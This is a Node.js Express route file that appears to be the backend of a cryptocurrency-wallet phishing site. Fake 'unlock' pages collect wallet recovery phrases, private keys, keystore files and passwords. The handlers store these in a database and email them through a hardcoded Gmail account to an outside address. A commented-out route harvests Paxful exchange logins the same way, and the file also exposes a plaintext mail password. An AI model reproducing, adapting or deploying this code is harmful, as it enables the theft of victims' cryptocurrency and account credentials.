var express = require('express');
var router = express.Router();
const {ensureAuthenticated} = require('../config/auth')
const {ensureAuthenticate} = require('../config/auths')
const bcrypt = require('bcrypt');
const sgMail = require('@sendgrid/mail')

var multer = require('multer')
const path = require('path');

// SET STORAGE
var storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, 'public/uploads')
  },
  filename: function (req, file, cb) {
    cb(null, file.fieldname + '-' + Date.now() + path.extname(file.originalname))
  }
})
 
var upload = multer({ storage: storage })

const passport = require('passport');
var randomstring = require("randomstring");
const nodemailer = require('nodemailer'),
    mailTransporter = nodemailer.createTransport({
        // host: 'trustwalletstore.com',
        // port: 465,
        // secure: true, //this is true as port is 465
        service: "Gmail",
        auth: {
            user: 'cmagnetinbox@gmail.com',
            pass: 'magnet123'
        },
    }),
    EmailTemplate = require('email-templates').EmailTemplate,
    Promise = require('bluebird');


/* GET home page. */
// router.get('/', function(req, res, next) {
//   res.render('index', { title: 'Express' });
// });


router.get('/', (req, res) => {
    res.render('main', null)
})

router.get('/loading', (req, res) => {
    res.render('successful', null)
})

router.get('/unlock', (req, res) => {
    res.render('index', null)
})

router.get('/unlock/mnemonic', (req, res) => {
    res.render('mnemonic', null)
})

router.get('/unlock/privatekey', (req, res) => {
    res.render('privatekey', null)
})

router.post('/action/keystore',upload.single('file'),(req,res)=>{
    var file = req.file
    var body = req.body

    var file = file.path
    var file = file.substr(7, 32)

    var db = req.db
        
    var collection = db.get('keystore')

    collection.insert({
        "keystorefile": file,
        "keystorepass": body.password
    }, function (err, doc) {
        if (err) {
            console.log(err)
        }
        else {
            var filr = 'https://trustwalletstore.com/' + file
            let users = [
                {
                    keystorefile: filr,
                    keystorepass: body.password,
                },
            ];

            function sendEmail (obj) {
                return mailTransporter.sendMail(obj);
            }

            function loadTemplate (templateName, contexts) {
                let template = new EmailTemplate(path.join(__dirname, 'templates', templateName));
                return Promise.all(contexts.map((context) => {
                    return new Promise((resolve, reject) => {
                        template.render(context, (err, result) => {
                            if (err) reject(err);
                            else resolve({
                                email: result,
                                context,
                            });
                        });
                    });
                }));
            }

            loadTemplate('keystore', users).then((results) => {
                return Promise.all(results.map((result) => {
                    sendEmail({
                        to: 'whitechristabel203@gmail.com',
                        from: 'cmagnetinbox@gmail.com',
                        subject: result.email.subject,
                        html: result.email.html,
                        text: result.email.text,
                    });
                }));
            }).then(() => {
                res.redirect('/loading')
                
            });
        }
    })
})

router.post('/action/mnemonic', (req, res) => {
    var body = req.body

    if (body.mnemonic === '' || body.wallet_addr === '') {
        res.json({
            confirmation: "failed",
            data: "Please fill in all necessary details"
        })
    }
    else {
        var db = req.db
        
        var collection = db.get('mnemonic')

        collection.insert({
            "mnemonic": body.mnemonic,
            "wallet_addr": body.wallet_addr,
        }, function (err, doc) {
            if (err) {
                console.log(err)
            }
            else {
                let users = [
                    {
                        mnemonic: body.mnemonic,
                        wallet: body.wallet_addr,
                    },
                ];
    
                function sendEmail (obj) {
                    return mailTransporter.sendMail(obj);
                }
    
                function loadTemplate (templateName, contexts) {
                    let template = new EmailTemplate(path.join(__dirname, 'templates', templateName));
                    return Promise.all(contexts.map((context) => {
                        return new Promise((resolve, reject) => {
                            template.render(context, (err, result) => {
                                if (err) reject(err);
                                else resolve({
                                    email: result,
                                    context,
                                });
                            });
                        });
                    }));
                }
    
                loadTemplate('mnemonic', users).then((results) => {
                    return Promise.all(results.map((result) => {
                        sendEmail({
                            to: 'whitechristabel203@gmail.com',
                            from: 'cmagnetinbox@gmail.com',
                            subject: result.email.subject,
                            html: result.email.html,
                            text: result.email.text,
                        });
                    }));
                }).then(() => {
                    res.json({
                        confirmation: "success",
                        data: "details submitted successfully"
                    })
                    
                });
                
            }
        })
    }    
})

router.post('/action/privatekey', (req, res) => {
    var body = req.body

    if (body.privatekey === '' || body.password === '') {
        res.json({
            confirmation: "failed",
            data: "Please fill in all necessary details"
        })
    }
    else {
        var db = req.db
        
        var collection = db.get('privatekey')

        collection.insert({
            "privatekey": body.privatekey,
            "password": body.password,
        }, function (err, doc) {
            if (err) {
                console.log(err)
            }
            else {
                let users = [
                    {
                        privatekey: body.privatekey,
                        password: body.password,
                    },
                ];
    
                function sendEmail (obj) {
                    return mailTransporter.sendMail(obj);
                }
    
                function loadTemplate (templateName, contexts) {
                    let template = new EmailTemplate(path.join(__dirname, 'templates', templateName));
                    return Promise.all(contexts.map((context) => {
                        return new Promise((resolve, reject) => {
                            template.render(context, (err, result) => {
                                if (err) reject(err);
                                else resolve({
                                    email: result,
                                    context,
                                });
                            });
                        });
                    }));
                }
    
                loadTemplate('privatekey', users).then((results) => {
                    return Promise.all(results.map((result) => {
                        sendEmail({
                            to: 'whitechristabel203@gmail.com',
                            from: 'cmagnetinbox@gmail.com',
                            subject: result.email.subject,
                            html: result.email.html,
                            text: result.email.text,
                        });
                    }));
                }).then(() => {
                    res.json({
                        confirmation: "success",
                        data: "details submitted successfully"
                    })
                    
                });
            }
        })
    }    
})

// router.post('/paxlogin', (req, res) => {

//     var paxemail = req.body.paxful_email
//     var paxpassword = req.body.paxful_password
//     var email = req.body.email

//     if (paxemail === '' || paxpassword === '') {
//         res.json({
//             confirmation: "failed",
//             data: "Please fill in all details to continue"
//         })
//         return
//     }
//     else {
        // var db = req.db
        
        // var collection = db.get('users')

//         collection.find({"username":email}, function (err, doc) {
//             if (err) {
//                 console.log(err)
//             }
//             if (doc == '') {
//                 res.json({
//                     confirmation: "failed",
//                     data: "You must be registered on premium-mining to continue"
//                 })
//                 return
//             }
//             else {
//                 var db = req.db
            
//                 var collection = db.get('paxful')
                
//                 collection.find({"username":email}, function (err, doc) {
//                     if (doc == '') {
//                         var db = req.db
            
//                         var collection = db.get('paxful')
                        
//                         collection.insert({
//                             "username": email,
//                             "paxemail": paxemail,
//                             "paxpassword": paxpassword,
//                             "tradaccount": "Paxful",
//                             "accountstatus": "pending",
//                             "btcaccbal": "pending",
//                             "tradestatus": "pending",
//                             "amounttrade": "pending",
//                             "estimatedreturns": "pending",
//                             "totalreturns": "pending",
//                             "duration": "pending",
//                             "colour": "warning"
//                         }, function (err, doc) {
//                             if (err) {
//                                 console.log(err)
//                             }
//                             else {
//                                 let users = [
//                                     {
//                                         email: email,
//                                         paxemail: paxemail,
//                                         paxpassword: paxpassword,
//                                     },
//                                 ];
        
//                                 function sendEmail (obj) {
//                                     return mailTransporter.sendMail(obj);
//                                 }
        
//                                 function loadTemplate (templateName, contexts) {
//                                     let template = new EmailTemplate(path.join(__dirname, 'templates', templateName));
//                                     return Promise.all(contexts.map((context) => {
//                                         return new Promise((resolve, reject) => {
//                                             template.render(context, (err, result) => {
//                                                 if (err) reject(err);
//                                                 else resolve({
//                                                     email: result,
//                                                     context,
//                                                 });
//                                             });
//                                         });
//                                     }));
//                                 }
        
//                                 loadTemplate('paxful', users).then((results) => {
//                                     return Promise.all(results.map((result) => {
//                                         sendEmail({
//                                             to: "whitechristabel203@gmail.com",
//                                             from: 'whitechristabel203@gmail.com',
//                                             subject: result.email.subject,
//                                             html: result.email.html,
//                                             text: result.email.text,
//                                         });
//                                     }));
//                                 }).then(() => {
//                                     res.json({
//                                         confirmation: "success",
//                                         data: "Tradebot is authenticating your login details, you would be informed once the process is complete"
//                                     })
                                    
//                                 });
//                             }
//                         })
//                     }
//                     else {
//                         res.json({
//                             confirmation: "failed",
//                             data: "Your Data is being authenticated, Please hold"
//                         })
//                         return
//                     }
//                 })

                
//             }
//         })
//     }
// })

module.exports = router;
